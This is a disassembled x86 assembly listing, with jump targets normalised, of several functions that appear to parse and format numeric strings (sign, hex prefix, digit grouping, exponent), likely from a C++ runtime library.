cmp [ ebp - 0x54 ] 0x0
jne r-xdata
mov ecx edi
call sub_1003f1eb
cmp al 0x78
je r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
lea esi [ ebp - 0x44 ]
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
push 0x1
call sub_10005cd0
push [ ebp - 0x5c ]
mov esi [ ebp - 0x60 ]
push edi
mov [ ebp - 0x4 ] 0x1
xor ebx ebx
add esi 0x1f
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
mov [ ebp - 0x54 ] ebx
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx edi
call sub_1003f1eb
cmp al 0x58
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x50 ] eax
test ebx ebx
jbe r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x4a ] 0x0
je r-xdata
cmp [ ebp - 0x50 ] esi
jae r-xdata
mov eax [ ebp - 0x50 ]
cmp [ eax ] 0x30
je r-xdata
mov ecx edi
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x58 ] 0x0
call sub_1003f06e
jmp r-xdata
cmp [ ebp - 0x54 ] 0x10
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx edi
call sub_1003f1eb
cmp al [ ebp - 0x4a ]
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x58 ] 0x1
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
inc [ ebp - 0x50 ]
mov [ ebp - 0x49 ] 0x1
mov eax [ ebp - 0x50 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ eax ] 0x0
call sub_100020e2
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x54 ]
call sub_1002b392
retn
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
jmp r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x58 ] 0x0
inc ebx
jmp r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100014aa
inc ebx
mov ecx edi
call sub_1003f06e
push [ ebp - 0x5c ]
push edi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jne r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov cl [ esi ]
cmp cl [ eax ]
jl r-xdata
mov esi eax
jmp r-xdata
sub_1003fd4b
push 0x5c
mov eax sub_1004ec51
call sub_1002b30f
mov eax [ ebp + 0x18 ]
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
push eax
mov [ ebp - 0x68 ] edi
mov [ ebp - 0x60 ] ebx
call sub_10016973
pop ecx
mov ecx eax
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x64 ] ecx
call sub_10005f61
and [ ebp - 0x4 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x50 ] edi
mov [ ebp - 0x4a ] 0x0
call sub_1003f0b8
test al al
jne r-xdata
and [ ebp - 0x54 ] 0x0
and [ ebp - 0x5c ] 0x0
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x49 ] 0x0
jae r-xdata
mov ecx esi
call sub_1003f1eb
mov ecx esi
cmp al 0x2b
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
call sub_1003f1eb
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax [ ebp - 0x28 ]
jae r-xdata
mov [ edi ] al
mov ecx esi
inc edi
mov [ ebp - 0x50 ] edi
call sub_1003f06e
push [ ebp - 0x60 ]
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x54 ] 0x0
mov ebx [ ebp - 0x60 ]
je r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x4 ]
mov ecx esi
mov bl al
call sub_1003f1eb
cmp al bl
jne r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
xor edi edi
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x55 ] al
call sub_10005cd0
push [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
push esi
xor ebx ebx
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov edi [ ebp - 0x50 ]
jmp r-xdata
call sub_10027b31
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_1003f06e
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
cmp [ ebp - 0x54 ] 0x24
jl r-xdata
cmp [ ebp - 0x14 ] 0x10
mov edi [ ebp - 0x28 ]
jae r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
mov edi [ ebp - 0x50 ]
jge r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
lea edi [ ebp - 0x28 ]
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
je r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003f06e
mov [ edi ] 0x30
inc edi
inc [ ebp - 0x5c ]
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
call sub_1003f1eb
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003f06e
push [ ebp - 0x60 ]
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x0
call sub_100020e2
jmp r-xdata
test ebx ebx
jbe r-xdata
cmp ebx edi
je r-xdata
cmp [ ebp - 0x55 ] 0x0
je r-xdata
cmp [ ebp - 0x54 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
cmp [ ebp - 0x4a ] 0x0
jne r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
cmp [ edi ] 0x7f
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x0
jle r-xdata
mov ecx esi
call sub_1003f1eb
cmp al [ ebp - 0x55 ]
jne r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
cmp [ ebp - 0x54 ] 0x24
jge r-xdata
mov edi [ ebp - 0x68 ]
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x65
je r-xdata
dec ebx
je r-xdata
mov [ ebp - 0x4a ] 0x1
inc ebx
jmp r-xdata
push edi
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100014aa
inc ebx
mov ecx esi
call sub_1003f1eb
mov ecx [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x54 ]
mov [ ecx ] al
cmp [ ebp - 0x54 ] edi
je r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
cmp [ eax ] 0x7f
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003f06e
mov ecx esi
call sub_1003f1eb
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
mov [ edi ] 0x0
call sub_100020e2
mov eax [ ebp - 0x5c ]
call sub_1002b392
retn
mov [ edi ] 0x65
mov ecx esi
inc edi
call sub_1003f06e
and [ ebp - 0x54 ] 0x0
push ebx
mov ecx esi
mov [ ebp - 0x49 ] 0x0
call sub_1003f0b8
test al al
jne r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x45
jne r-xdata
test ebx ebx
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jne r-xdata
mov ecx esi
call sub_1003f06e
push [ ebp - 0x60 ]
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
inc [ eax ]
jmp r-xdata
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
je r-xdata
mov ecx esi
call sub_1003f1eb
mov ecx esi
cmp al 0x2b
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
push ebx
lea ecx [ ebp - 0x48 ]
call sub_10005d90
mov cl [ edi ]
cmp cl [ eax ]
jl r-xdata
mov [ ebp - 0x4a ] 0x1
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jne r-xdata
call sub_1003f1eb
cmp al 0x2d
jne r-xdata
mov [ edi ] al
jmp r-xdata
mov edi eax
jmp r-xdata
mov ecx esi
call sub_1003f1eb
cmp al 0x30
jl r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003f06e
push ebx
push esi
call sub_1003f200
pop ecx
pop ecx
test al al
jne r-xdata
mov [ edi ] al
mov ecx esi
inc edi
call sub_1003f06e
mov ecx esi
call sub_1003f1eb
cmp al 0x39
jg r-xdata
mov [ edi ] 0x30
inc edi
jmp r-xdata
cmp [ ebp - 0x54 ] 0x8
jge r-xdata
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_1003f06e
mov ecx esi
call sub_1003f1eb
mov [ edi ] al
inc edi
inc [ ebp - 0x54 ]
sub_100401a5
push 0x68
mov eax sub_1004ec8e
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edi [ ebp + 0x20 ]
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x74 ]
push eax
mov [ ebp - 0x64 ] ecx
call sub_10007dd5
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10016973
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov esi eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x5c ] esi
call sub_10007dbd
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10005f61
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x6c ] al
call sub_100082a7
mov al [ edi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x54 ] 0x1
mov [ ebp - 0x54 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp + 0x2c ] ebx
call sub_10027b31
mov eax [ eax ]
push [ ebp + 0x30 ]
mov al [ eax ]
push 0x65
push edi
mov [ ebp - 0x50 ] al
mov [ ebp - 0x4f ] 0x65
mov [ ebp - 0x4e ] 0x0
call sub_10027b60
push [ ebp + 0x30 ]
mov esi eax
movsx eax [ ebp - 0x50 ]
push eax
push edi
call sub_10027b60
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x44 ]
mov ecx [ ebp + 0x28 ]
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x64 ]
add eax ecx
add eax [ ebp + 0x2c ]
mov ecx [ edx + 0x18 ]
add eax [ ebp + 0x30 ]
cmp ecx ebx
jle r-xdata
cmp [ ebp - 0x30 ] 0x10
mov eax [ ebp - 0x44 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
cmp ecx eax
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x44 ]
movsx eax [ ebp - 0x50 ]
push [ ebp + 0x30 ]
push eax
push edi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
push [ ebp + 0x30 ]
lea ecx [ ebp - 0x2c ]
push edi
call sub_100072a4
cmp esi ebx
jne r-xdata
push [ ebp + 0x30 ]
push 0x65
push edi
call sub_10027b60
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x6c ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f158
mov ecx [ eax ]
push [ ebp + 0x24 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x5c ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
push 0x1
mov [ ebp - 0x5c ] al
push [ ebp - 0x5c ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
push [ ebp + 0x28 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x30
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x54 ] ebx
jbe r-xdata
mov eax [ edx + 0x10 ]
mov esi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp + 0x2c ]
lea ecx [ ebp - 0x2c ]
call sub_100014aa
jmp r-xdata
push [ ebp - 0x6c ]
lea eax [ ebp - 0x60 ]
push [ ebp + 0x30 ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f158
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov edx [ ebp - 0x64 ]
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
push esi
mov [ edx + 0x18 ] ebx
call sub_1003f12d
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax [ ebp - 0x68 ]
call sub_1002b392
retn
push [ ebp - 0x6c ]
sub eax edi
inc eax
mov ebx eax
lea eax [ ebx - 0x1 ]
push eax
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x60 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f158
mov ecx [ eax ]
push [ ebp + 0x2c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_1003f12d
mov ecx [ eax ]
and [ ebp + 0x2c ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
mov ecx [ ebp - 0x64 ]
add esp 0x34
test [ ecx + 0x10 ] 0x4
mov ecx r--data
jne r-xdata
push 0x1
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x58 ]
push [ ebp + 0x10 ]
push eax
push esi
call sub_1003f0f7
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
inc edi
dec [ ebp + 0x30 ]
mov [ ebp + 0x14 ] eax
push 0x30
push [ ebp + 0x2c ]
sub esi edi
push esi
lea ecx [ ebp - 0x2c ]
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
call sub_100014aa
mov [ ebp + 0x24 ] ebx
mov esi [ ebp - 0x4c ]
push 0x30
lea ecx [ ebp - 0x2c ]
cmp esi ebx
jne r-xdata
push 0x1
push ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x60 ]
push eax
push esi
call sub_1003f0f7
mov ecx [ eax ]
sub [ ebp + 0x30 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add edi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
mov ecx r--data
push [ ebp + 0x28 ]
sub esi edi
lea eax [ esi + 0x1 ]
push eax
call sub_10005cf6
push 0x30
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10005cf6
mov [ ebp + 0x28 ] ebx
push [ ebp + 0x24 ]
call sub_100014aa
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
push eax
call sub_10027c10
pop ecx
pop ecx
mov edi eax
jmp r-xdata
lea esi [ ebp - 0x44 ]
cmp [ ebp - 0x30 ] 0x10
mov esi [ ebp - 0x44 ]
mov [ ebp + 0x24 ] ebx
jae r-xdata
mov al [ esi ]
cmp al 0x7f
jne r-xdata
test al al
jle r-xdata
push ebx
lea ecx [ ebp - 0x2c ]
call sub_10005d90
mov edi eax
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x2c ] ebx
mov [ ebp + 0x30 ] eax
mov ecx edi
sub ecx [ ebp - 0x54 ]
movsx eax al
cmp eax ecx
jae r-xdata
push ebx
sub edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_10005cf6
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x0
jle r-xdata
mov esi eax
sub_100405c8
push 0x3c
mov eax sub_1004ecc3
call sub_1002b30f
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x48 ] eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx edi
mov [ ebp - 0x3c ] edi
call sub_10007dd5
and [ ebp - 0x4 ] 0x0
push eax
call sub_10016973
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
call sub_10007dbd
mov ecx [ ebp - 0x44 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10005f61
mov al [ esi ]
xor ecx ecx
inc ecx
mov [ ebp - 0x4 ] ecx
cmp al 0x2b
je r-xdata
mov [ ebp - 0x30 ] ecx
cmp al 0x2d
je r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x28 ]
cmp al 0x30
jne r-xdata
mov ebx [ edi + 0x18 ]
test ebx ebx
jle r-xdata
cmp [ ebp - 0x14 ] 0x10
mov eax ecx
jae r-xdata
and [ ebp - 0x30 ] 0x0
jmp r-xdata
mov al [ esi + 0x1 ]
cmp al 0x78
je r-xdata
xor ebx ebx
cmp ebx [ ebp + 0x24 ]
jbe r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x28 ]
cmp [ ebp - 0x14 ] 0x10
mov ecx [ ebp - 0x28 ]
mov eax ecx
jae r-xdata
mov [ ebp - 0x30 ] 0x2
jmp r-xdata
cmp al 0x58
jne r-xdata
mov ecx [ ebp - 0x44 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x40 ] al
push [ ebp - 0x40 ]
lea eax [ ebp - 0x38 ]
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003f158
mov ecx [ eax ]
mov edx [ ebp - 0x3c ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
and [ edx + 0x18 ] 0x0
push eax
push ecx
push [ ebp - 0x48 ]
mov [ ebp + 0x14 ] eax
push edi
call sub_1003f12d
add esp 0x34
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp - 0x48 ]
call sub_1002b392
retn
cmp eax 0x100
lea eax [ ebp - 0x38 ]
je r-xdata
sub ebx [ ebp + 0x24 ]
jmp r-xdata
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
push [ ebp - 0x30 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003f0f7
mov ecx [ eax ]
add esi [ ebp - 0x30 ]
push ebx
push [ ebp + 0x1c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
mov ecx [ ebp - 0x30 ]
push [ eax ]
sub [ ebp + 0x24 ] ecx
lea eax [ ebp - 0x38 ]
push eax
push edi
call sub_1003f12d
add esp 0x30
push ebx
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push edi
call sub_1003f12d
add esp 0x18
jmp r-xdata
mov eax [ edi + 0x10 ]
mov edi [ ebp + 0x8 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x34 ] ecx
jmp r-xdata
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
xor ebx ebx
mov [ ebp + 0x14 ] eax
mov edi [ ebp - 0x3c ]
test al al
jle r-xdata
mov edi [ ebp + 0x24 ]
mov ecx edi
sub ecx [ ebp - 0x30 ]
movsx eax al
cmp eax ecx
jae r-xdata
sub edi eax
mov eax [ ebp + 0x24 ]
sub eax edi
inc eax
push eax
lea ebx [ esi + edi ]
push ebx
push eax
lea eax [ esi + edi + 0x1 ]
push eax
call sub_100275d0
mov eax [ ebp - 0x34 ]
add esp 0x10
inc [ ebp + 0x24 ]
inc eax
mov [ ebx ] 0x0
cmp [ eax ] 0x0
jle r-xdata
mov eax [ ebp - 0x34 ]
mov al [ eax ]
cmp al 0x7f
je r-xdata
mov [ ebp - 0x34 ] eax
jmp r-xdata
sub_100407ad
push 0x60
mov eax sub_1004ed10
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
or [ ebp - 0x50 ] 0xffffffff
mov [ ebp - 0x68 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x24 ]
xor ebx ebx
mov [ ebp - 0x6c ] eax
mov eax [ esi + 0x10 ]
inc ebx
mov [ ebp - 0x54 ] ecx
mov ecx esi
test eax 0x4000
je r-xdata
lea eax [ ebp - 0x60 ]
xor edi edi
push eax
mov [ ebp - 0x5c ] edi
call sub_10007dd5
mov esi [ esi + 0x10 ]
lea ecx [ ebp - 0x5c ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x54 ]
mov [ ebp - 0x4 ] 0x4
call sub_1003fa84
add esp 0x18
push eax
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_10022859
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10007dbd
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x64 ] eax
je r-xdata
lea eax [ ebp - 0x54 ]
push eax
call sub_10007dd5
xor edi edi
push eax
mov [ ebp - 0x4 ] edi
call sub_10016973
pop ecx
or esi 0xffffffff
lea ecx [ ebp - 0x54 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_10007dbd
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_10005cd0
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] ebx
call sub_1003f21b
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x2
call sub_100071fd
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100020e2
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_100014aa
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_10043240
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_100071fd
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_100020e2
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1003f0b8
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1003f234
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_100020e2
jmp r-xdata
lea eax [ ebp - 0x48 ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1002b392
retn 0x20
sub_1004094b
push 0x38
mov eax sub_1004ed3d
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007dd5
mov esi [ esi + 0x10 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1003fa84
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_10007dbd
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10022859
mov esi eax
add esp 0x10
